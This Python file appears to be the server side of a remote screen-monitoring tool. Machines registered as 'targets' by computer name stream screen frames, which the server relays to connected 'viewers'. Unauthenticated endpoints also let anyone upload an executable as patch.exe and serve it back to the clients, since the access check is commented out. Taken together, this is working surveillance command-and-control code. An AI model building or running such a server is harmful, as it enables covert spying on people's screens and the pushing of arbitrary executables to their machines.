import json
import os
import asyncio
import logging
import uvicorn

# Import Flask and the ASGI-to-WSGI adapter
from flask import Flask, render_template_string,request, jsonify, redirect, url_for,Response
from a2wsgi import WSGIMiddleware

VERSION_FILE = os.path.join(os.path.abspath(os.path.dirname(__file__)), "version.txt")

def get_current_version():
    if not os.path.exists(VERSION_FILE):
        with open(VERSION_FILE, "w") as f:
            f.write("1")  # Default starting version
        return "1"
    with open(VERSION_FILE, "r") as f:
        return f.read().strip()

def save_version(number):
    with open(VERSION_FILE, "w") as f:
        f.write(str(number).strip())
# --- CONFIGURATION ---
# Define the directory where patches will be stored
PATCH_DIR = os.path.join(os.path.abspath(os.path.dirname(__file__)), "patches")

# Ensure the directory exists when the server starts
if not os.path.exists(PATCH_DIR):
    os.makedirs(PATCH_DIR)

logging.basicConfig(level=logging.INFO)

# ==========================================
# 1. DEFINE YOUR FLASK SITE
# ==========================================
flask_app = Flask(__name__)



# --- ACCESS RULES ---
KEY_FILE = "KEY.TXT"
if not os.path.exists(KEY_FILE):
    with open(KEY_FILE, "w") as f:
        f.write("ChangeMe123")

with open(KEY_FILE, "r") as f:
    SITE_SECRET_KEY = f.read().strip()


# @flask_app.before_request
# def restrict_access():
#     # These must match the exact def names of your functions
#     allowed_routes = ["patch"]
    
#     if request.endpoint in allowed_routes:
#         return
        
#     user_cookie = request.cookies.get("site_access_token")
#     if user_cookie != SITE_SECRET_KEY:
#         return redirect(url_for("login"))

@flask_app.route("/patch_number", methods=["GET"])
def get_patch_version():
    current_ver = get_current_version()
    return jsonify({
        "status": "success",
        "patch_number": current_ver
    })

@flask_app.route("/patch", methods=["GET", "POST"])
def patch_upload():
    if request.method == "POST":
        if "patch_file" not in request.files:
            return jsonify({"status": "error", "message": "No file part in the request"}), 400
            
        file = request.files["patch_file"]
        version_input = request.form.get("version_number", "").strip()
        
        if file.filename == "":
            return jsonify({"status": "error", "message": "No file selected"}), 400
            
        if not version_input:
            return jsonify({"status": "error", "message": "No version number provided"}), 400
            
        if file:
            # Save the file
            target_path = os.path.join(PATCH_DIR, "patch.exe")
            file.save(target_path)
            
            # Save the new version sequence to the version text file
            save_version(version_input)
            
            return jsonify({
                "status": "success", 
                "message": f"Patch uploaded successfully as version {version_input}"
            })

    # Updated inline interface containing the version assignment input
    current_ver = get_current_version()
    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Upload Patch</title>
        <style>
            body {{ background: #0d0e15; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
            .upload-box {{ background: #1a1c2e; padding: 30px; border-radius: 8px; border: 1px solid #2e3152; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5); width: 320px; }}
            input[type="file"] {{ margin: 15px 0; color: #a0aec0; }}
            input[type="text"] {{ background: #0d0e15; border: 1px solid #2e3152; color: white; padding: 10px; border-radius: 4px; width: 90%; text-align: center; margin-bottom: 20px; }}
            button {{ background: #3b82f6; color: white; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; width: 100%; font-size: 1rem; font-weight: bold; }}
            button:hover {{ background: #2563eb; }}
            p {{ color: #a0aec0; font-size: 0.9rem; }}
        </style>
    </head>
    <body>
        <div class="upload-box">
            <h2>UPGRADE SYSTEM PATCH</h2>
            <p>Current Server Version: <strong>{current_ver}</strong></p>
            <form action="/patch" method="POST" enctype="multipart/form-data">
                <input type="text" name="version_number" placeholder="New Version (e.g., 2 or 1.0.4)" required autocomplete="off">
                <input type="file" name="patch_file" required autocomplete="off"><br>
                <button type="submit">UPLOAD & APPLY</button>
            </form>
        </div>
    </body>
    </html>
    """

@flask_app.route("/getpatch", methods=["GET"])
def get_patch():
    target_path = os.path.join(PATCH_DIR, "patch.exe")
    
    if not os.path.exists(target_path):
        return jsonify({"status": "error", "message": "Patch file not found on server"}), 404

    # 1. Create a generator that reads the file in binary mode from the server's disk
    def generate_file_stream():
        with open(target_path, "rb") as f:
            while True:
                chunk = f.read(16384) # 16KB blocks
                if not chunk:
                    break
                yield chunk

    # 2. Grab the exact file size on disk to provide a proper header
    file_size = os.path.getsize(target_path)

    # 3. Stream the response directly over the socket connection
    response = Response(generate_file_stream(), mimetype="application/octet-stream")
    response.headers["Content-Length"] = file_size
    response.headers["Content-Disposition"] = "attachment; filename=patch.exe"
    
    print(f"[Server] Streaming patch.exe raw binary ({file_size} bytes) directly to client...")
    return response

@flask_app.route('/')
def home_page():
    # You can return HTML files here using render_template('index.html')
    return render_template_string("""
        <!DOCTYPE html>
        <html>
        <head><title>My Flask Site</title></head>
        <body style="font-family: Arial, sans-serif; text-align: center; margin-top: 50px;">
            <h1>Welcome to the Flask Web Page</h1>
            <p>This page is served by Flask, while WebSockets run in the background!</p>
        </body>
        </html>
    """)

@flask_app.route('/status')
def status_page():
    return {"status": "Server running", "active_targets": list(live_targets.keys())}

# Wrap the Flask app so the async Uvicorn server can speak to it
wsgi_middleware = WSGIMiddleware(flask_app)


# ==========================================
# 2. YOUR EXACT WEBSOCKET LOGIC
# ==========================================
live_targets = {}      # { "Target-PC": send_coroutine }
connected_viewers = set()  # { send_coroutine, send_coroutine }

async def broadcast_to_viewers(payload_dict):
    if not connected_viewers:
        return
    message = {
        "type": "websocket.send",
        "text": json.dumps(payload_dict)
    }
    await asyncio.gather(*[viewer(message) for viewer in list(connected_viewers)], return_exceptions=True)

async def websocket_handler(scope, receive, send):
    await send({'type': 'websocket.accept'})
    client_type = None
    target_name = None
    
    try:
        while True:
            try:
                message = await asyncio.wait_for(receive(), timeout=15.0)
            except asyncio.TimeoutError:
                break
            
            if message['type'] == 'websocket.disconnect':
                break
            
            if 'text' in message:
                payload = json.loads(message['text'])
                msg_type = payload.get("type")
                
                if msg_type == "register_viewer":
                    client_type = "viewer"
                    connected_viewers.add(send)
                    await send({
                        'type': 'websocket.send',
                        'text': json.dumps({"type": "list", "data": list(live_targets.keys())})
                    })
                
                elif msg_type == "register_target":
                    client_type = "target"
                    target_name = payload.get("COMPUTERNAME", "Unknown-Target")
                    live_targets[target_name] = send
                    await broadcast_to_viewers({"type": "list", "data": list(live_targets.keys())})
                
                elif msg_type == "stream_frame" and client_type == "target":
                    frame_data = payload.get("frame")
                    await broadcast_to_viewers({
                        "type": "frame",
                        "user": target_name,
                        "frame": frame_data
                    })
                    await send({
                        'type': 'websocket.send',
                        'text': json.dumps({"status": "OK"})
                    })
                    
    except Exception as e:
        logging.error(f"WebSocket Error: {e}")
    finally:
        if client_type == "viewer" and send in connected_viewers:
            connected_viewers.remove(send)
        elif client_type == "target" and target_name in live_targets:
            del live_targets[target_name]
            await broadcast_to_viewers({"type": "list", "data": list(live_targets.keys())})


# ==========================================
# 3. CENTRAL ROUTER (THE APP ENTRY POINT)
# ==========================================
async def app(scope, receive, send):
    """
    This main router acts like a traffic cop. 
    It checks what kind of connection is coming in.
    """
    # If the connection request is a WebSocket connection, pass it to your websocket handler
    if scope['type'] == 'websocket':
        await websocket_handler(scope, receive, send)
        return

    # If it's standard web traffic (GET/HEAD/POST), pass it down to Flask
    if scope['type'] == 'http':
        await wsgi_middleware(scope, receive, send)
        return


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    uvicorn.run(app, host="0.0.0.0", port=port, log_level="info")